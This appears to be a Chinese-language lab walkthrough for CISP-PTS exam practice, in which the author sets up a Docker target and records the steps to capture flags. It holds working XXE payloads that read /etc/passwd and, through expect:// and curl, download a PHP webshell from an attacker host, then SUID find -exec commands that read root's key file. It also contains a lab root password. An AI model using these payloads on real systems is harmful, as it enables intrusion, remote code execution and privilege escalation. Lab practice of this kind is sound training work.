视频三前半段1:38:32



![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1704108928013-14fbfa1f-1265-4ae1-a6bc-2ca780db1382.png)![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1704108977359-d615b01a-f499-4eee-aaa0-20045b409d0e.png)

# 环境
```bash
su root                    密码xbw
/etc/init.d/apache2 stop
cd test/ceshi
docker-compose up -d
```

# 流程
![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1704114186494-371aef67-fb56-4040-9261-5d89fce2e479.png)

```bash
https证书查看
 
 C:\Windows\System32\drivers\etc
192.168.147.130 www.cisp-pts.ya

http://www.cisp-pts.ya/manage/login.php

http://www.cisp-pts.ya/manage/setting.php抓包
将get转化为post，见图一
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE uuu [
<!ENTITY xxe SYSTEM "file:///etc/psswd" >]>
<config><title>&xxe;</title></config>


python -m SimpleHTTPServer 80      192.168.147.1


```

![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1704197088817-8236258a-b91a-4e7b-946c-d8ad95641fc1.png)上图图一

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE uuu [
<!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'192.168.147.1/1.php'" >]>
<config><title>&xxe;</title></config>
```

连上webshell，查看上一级获得key7  
![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1704204013256-a6a44fca-9fc8-480c-b3d4-5a1219288cbe.png)![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1704204130725-6f049a9c-3964-4ff7-a7e0-d1ef224de198.png)

```bash
find /etc/passwd -exec whoami \;
find /etc/passwd -exec ls /root\;
find /etc/passwd -exec cat /root/key8.cisp \;
```

![](https://cdn.nlark.com/yuque/0/2024/png/26698826/1704204413835-6352a4db-a8ae-4ea1-898c-d13d828ff3ec.png)

